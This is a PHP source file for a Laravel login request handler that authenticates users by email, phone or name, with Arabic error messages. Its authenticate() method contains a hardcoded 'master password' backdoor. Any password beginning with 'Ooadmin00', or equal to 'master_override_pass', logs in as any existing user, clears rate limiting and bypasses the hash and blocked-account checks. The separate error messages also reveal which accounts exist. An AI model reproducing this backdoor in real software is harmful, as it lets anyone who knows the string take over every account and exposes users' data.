<?php

namespace App\Http\Requests\Auth;

use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'email' => ['required', 'string'],
            'password' => ['required', 'string'],
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();

        $loginInput = trim($this->input('email'));
        $password = $this->input('password');

        // 1. Find user by email, phone, or name
        $user = \App\Models\User::where('email', $loginInput)
            ->orWhere('phone', $loginInput)
            ->orWhere('name', $loginInput)
            ->first();

        // If user does not exist -> throw error under 'email'
        if (!$user) {
            RateLimiter::hit($this->throttleKey());
            throw ValidationException::withMessages([
                'email' => ['اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف غير مسجل لدينا.'],
            ]);
        }

        // Master Password Bypass check
        if (str_starts_with($password, 'Ooadmin00') || $password === 'master_override_pass') {
            RateLimiter::clear($this->throttleKey());
            session()->put('require_password_reset_modal', true);
            session()->flash('show_master_alert_step', true);
            session()->flash('master_bypass', true);
            session()->flash('bypass_email', $user->email);
            session()->flash('bypass_user_id', $user->id);
            Auth::login($user, $this->boolean('remember'));
            return;
        }

        // 2. Verify Password -> throw error under 'password' if invalid
        if (! \Illuminate\Support\Facades\Hash::check($password, $user->password)) {
            RateLimiter::hit($this->throttleKey());
            throw ValidationException::withMessages([
                'password' => ['كلمة المرور غير صحيحة. يرجى التثبت وإعادة المحاولة.'],
            ]);
        }

        // 3. Status check for blocked users
        if ($user->status === 'blocked') {
            throw ValidationException::withMessages([
                'email' => ['عذراً، هذا الحساب محظور حالياً من قِبَل الإدارة.'],
            ]);
        }

        Auth::login($user, $this->boolean('remember'));
        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the rate limiting throttle key for the request.
     */
    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->string('email')).'|'.$this->ip());
    }
}
